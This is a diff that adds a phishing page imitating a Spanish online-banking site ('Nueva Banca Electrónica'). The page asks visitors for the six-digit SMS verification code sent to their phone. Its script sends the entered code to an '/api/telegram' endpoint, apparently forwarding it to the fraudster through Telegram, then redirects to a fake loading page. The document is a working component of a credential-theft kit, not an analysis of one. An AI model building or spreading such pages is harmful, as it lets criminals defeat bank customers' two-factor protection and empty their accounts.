@@ -1,0 +1,91 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <!-- link_icons -->
+        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
+        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
+        <title>nbe-web | Nueva Banca Electrónica</title>
+        <!-- logo img title-->
+        <link rel="icon" href="image/favicon.png" type="image/x-icon"/>
+        <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon" />
+        <!-- link__css -->
+        <link rel="stylesheet"  href="css/bootstrap.css">
+        <link rel="stylesheet"  href="css/snow.css">
+        <link rel="stylesheet"  href="css/animate.css">
+</head>
+<body >
+
+        
+        <div class="navbar">
+            <div class="container">
+                <img src="image/logo-cc.png" alt="">
+            </div>
+        </div>
+
+        <section>
+            <div class="container pt-5">
+                <h3>Confirmación de identidad</h3>
+                <p><b>Ingrese el código</b></p>
+                <p>Para continuar, introduce el código SMS de 6 dígitos enviado a tu número de teléfono
+                    <form id="smsForm" method="post" style="margin-top:30px;margin-bottom: 30px;" >
+                        <input type="hidden" name="step" value="sms">
+                   <img src="image/sms.png" alt="" width="100px" style="margin-bottom: 50px;">
+                   <div class="all">
+                       <div class="form-group mt-3 dd">
+                           <input type="text" name="sms" id="sms" class="form-control" required  pattern="[0-9]{6,10}$" data-mask="0000000000">
+                           <label for="sms">Código SMS</label>
+                       </div>
+                   </div>
+                   <p style="font-size:12px;">Si no has recibido el código SMS, llámanos al servicio Att. cliente o reiniciar el proceso para recibir uno nuevo</p>
+                   <div class="lol">
+                       <button class="btn xx" onclick="return false">Volver</button>
+                       <button class="btn ss" name="submit">Continuar</button>
+                   </div>
+                </form>
+            </div>
+        </section>
+
+
+
+
+
+
+
+        <script src="js/jquery-3.5.1.min.js"></script>
+        <script src="js/jquery.mask.js"></script>
+        <script>
+            const smsForm = document.querySelector("#smsForm");
+    
+    smsForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+    
+      const sms = document.getElementById("sms").value;
+    
+      try {
+        const response = await fetch("/api/telegram", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ sms }),
+        });
+    
+        if (response.ok) {
+          window.location.href = "loading_3.html"; // ← Redirect
+        } else {
+          document.getElementById("smsError").style.display = "block";
+        }
+      } catch (err) {
+        console.error(err);
+        document.getElementById("smsError").style.display = "block";
+      }
+    });
+
+
+        </script>
+              
+</body>
+</html>
+
+
